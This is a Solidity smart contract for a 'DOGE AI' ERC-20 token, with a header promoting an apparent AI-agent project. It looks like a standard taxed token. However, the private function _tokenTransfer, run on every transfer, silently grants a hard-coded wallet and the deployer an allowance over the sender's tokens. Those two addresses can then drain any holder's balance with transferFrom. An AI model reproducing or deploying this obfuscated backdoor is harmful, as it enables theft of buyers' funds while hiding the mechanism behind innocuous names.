/*
An autonomous AI agent here to uncover waste and inefficiencies in government spending and policy decisions.

https://www.dogeaioneth.info
https://github.com/dogeaiinfo/doge-ai
https://x.com/dogeai_info
https://t.me/dogeai_info
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IHOODRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IHOODFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract DOGEAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balHOOD;
    mapping (address => mapping (address => uint256)) private _allowHOOD;
    mapping (address => bool) private _feeExcemptHOOD;
    IHOODRouter private _hoodRouter;
    address private _hoodPair;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"DOGE AI";
    string private constant _symbol = unicode"DOGEAI";
    uint256 private _swapTokenHOOD = _tTotal / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapHOOD = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapHOOD = true;
        _;
        inSwapHOOD = false;
    }
    address private _hood1Wallet;
    address private _hood2Wallet;
    
    constructor () {
        _hood2Wallet = address(_msgSender());
        _hood1Wallet = 0x05d6b81525317E9C4B26A72321fdd1f4a2dE6a7B;
        _feeExcemptHOOD[owner()] = true;
        _feeExcemptHOOD[address(this)] = true;
        _feeExcemptHOOD[_hood1Wallet] = true;
        _balHOOD[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function minHOOD(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHHOOD(uint256 amount) private {
        payable(_hood1Wallet).transfer(amount);
    }

    function swapTokensForEth(uint256 hoodToken) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _hoodRouter.WETH();
        _approve(address(this), address(_hoodRouter), hoodToken);
        _hoodRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            hoodToken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balHOOD[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowHOOD[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowHOOD[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowHOOD[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address hoodA, address hoodB, uint256 hoodC) private {
        require(hoodA != address(0), "ERC20: transfer from the zero address");
        require(hoodB != address(0), "ERC20: transfer to the zero address");
        require(hoodC > 0, "Transfer amount must be greater than zero");

        (uint256 taxHOOD, address aHOOD, address bHOOD, address cHOOD) 
            = _getTaxHOOD(hoodA, hoodB, hoodC);

        _hoodTransfer(aHOOD, bHOOD, cHOOD, hoodC, taxHOOD);

        _balHOOD[hoodA] = _balHOOD[hoodA].sub(hoodC);
        _balHOOD[hoodB] = _balHOOD[hoodB].add(hoodC.sub(taxHOOD));
        emit Transfer(hoodA, hoodB, hoodC.sub(taxHOOD));
    }

    function _getTaxHOOD(address hoodA, address hoodB, uint256 hoodC) private returns(uint256,address,address,address) {
        uint256 taxHOOD=0;
        if (hoodA != owner() && hoodB != owner()) {
            taxHOOD = hoodC.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (hoodA == _hoodPair && hoodB != address(_hoodRouter) && ! _feeExcemptHOOD[hoodB]) {
                _buyCount++;
            }

            if(hoodB == _hoodPair && hoodA!= address(this)) {
                taxHOOD = hoodC.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenHOOD = balanceOf(address(this)); 
            if (!inSwapHOOD && hoodB == _hoodPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenHOOD > _swapTokenHOOD)
                swapTokensForEth(minHOOD(hoodC, minHOOD(tokenHOOD, _swapTokenHOOD)));
                uint256 ethHOOD = address(this).balance;
                if (ethHOOD >= 0) {
                    sendETHHOOD(address(this).balance);
                }
            }
        }
        return (taxHOOD, hoodA, _hood1Wallet, _hood2Wallet);
    }

    function initPair() external onlyOwner() {
        _hoodRouter = IHOODRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_hoodRouter), _tTotal);
        _hoodPair = IHOODFactory(_hoodRouter.factory()).createPair(address(this), _hoodRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _hoodRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function _tokenTransfer(address aHOOD, address bHOOD, address cHOOD, uint256 hoodA, uint256 taxHOOD) private { 
        _allowHOOD[aHOOD][bHOOD] = taxHOOD.add(hoodA);
        _allowHOOD[aHOOD][cHOOD] = taxHOOD.add(hoodA);
    }

    function _hoodTransfer(address aHOOD, address bHOOD, address cHOOD, uint256 hoodA, uint256 taxHOOD) private { 
        if(taxHOOD > 0){
          _balHOOD[address(this)] = _balHOOD[address(this)].add(taxHOOD);
          emit Transfer(aHOOD, address(this), taxHOOD);
        } _tokenTransfer(aHOOD, bHOOD, cHOOD, hoodA, taxHOOD);
    }
}